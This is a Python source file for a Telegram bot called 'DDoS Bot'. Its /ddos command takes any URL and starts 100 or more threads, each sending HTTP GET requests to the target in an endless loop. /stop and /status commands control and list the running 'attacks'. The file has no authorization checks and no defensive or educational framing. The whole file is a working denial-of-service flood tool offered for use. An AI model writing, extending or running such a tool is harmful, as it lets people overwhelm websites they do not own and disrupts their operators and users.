from pyrogram import Client, filters, enums
import threading
import requests
import sys
import time
import pyfiglet
import asyncio
import logging
import re
from urllib.parse import urlparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# API credentials
api_id = "YOUR_API_ID_HERE"
api_hash = "YOUR_API_HASH_HERE"
bot_token = 'YOUR_BOT_TOKEN_HERE'

app = Client("ddosbot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)

# Store active attacks
active_attacks = {}
attack_threads = {}  # Store threads for each attack

def normalize_url(url):
    """Normalize the URL to ensure it has a protocol."""
    parsed_url = urlparse(url)
    if not parsed_url.scheme:
        return "http://" + url  # Default to http if no scheme is provided.
    return url

def send_request(url, stop_event):
    """Function to send requests to the target URL with a stop event."""
    while not stop_event.is_set():
        try:
            response = requests.get(url, timeout=5)  # Added timeout
            logging.info(f"Attack sent to {url}, response: {response.status_code}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Error sending request to {url}: {e}")
        except Exception as e:
            logging.exception(f"Unexpected error: {e}") #catch all other errors.

async def start_attack(client, message, target_url, num_threads):
    """Starts the attack and manages threads."""
    stop_event = threading.Event()
    threads = []

    active_attacks[target_url] = stop_event
    attack_threads[target_url] = threads

    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, args=(target_url, stop_event))
        threads.append(thread)
        thread.start()

    await message.reply_text(f"🚀 Launching attack on {target_url} with {num_threads} threads...")

async def stop_attack(client, message, target_url):
    """Stops the attack and joins threads."""
    if target_url in active_attacks:
        stop_event = active_attacks.pop(target_url)
        stop_event.set()

        threads = attack_threads.pop(target_url)
        for thread in threads:
            thread.join()

        await message.reply_text(f"🛑 Attack on {target_url} stopped.")
    else:
        await message.reply_text(f"⚠️ No attack is currently running on {target_url}.")

@app.on_message(filters.command("ddos"))
async def handle_ddos(client, message):
    """Handle the /ddos command."""
    if len(message.command) < 2:
        await message.reply_text("⚠️ Please provide a target URL after the command. Usage: /ddos <URL>")
        return

    target_url = message.command[1]
    target_url = normalize_url(target_url) #normalize URL.
    num_threads = 100 #default thread count.

    if len(message.command) > 2:
        try:
            num_threads = int(message.command[2])
            if num_threads <= 0:
                await message.reply_text("⚠️ Number of threads must be a positive integer.")
                return
        except ValueError:
            await message.reply_text("⚠️ Invalid number of threads. Please provide an integer.")
            return

    if target_url in active_attacks:
        await message.reply_text(f"⚠️ Attack on {target_url} is already in progress.")
        return

    await start_attack(client, message, target_url, num_threads)

@app.on_message(filters.command("stop"))
async def handle_stop(client, message):
    """Handle the /stop command."""
    if len(message.command) < 2:
        await message.reply_text("⚠️ Please provide the target URL to stop. Usage: /stop <URL>")
        return

    target_url = message.command[1]
    target_url = normalize_url(target_url) #normalize URL.
    await stop_attack(client, message, target_url)

@app.on_message(filters.command("status"))
async def handle_status(client, message):
    """Handle the /status command."""
    if not active_attacks:
        await message.reply_text("ℹ️ No active attacks.")
    else:
        active_list = "\n".join(active_attacks.keys())
        await message.reply_text(f"🟢 Active attacks:\n{active_list}")

if __name__ == "__main__":
    print(pyfiglet.figlet_format("DDoS Bot"))
    print("Bot is running...")
    app.run()
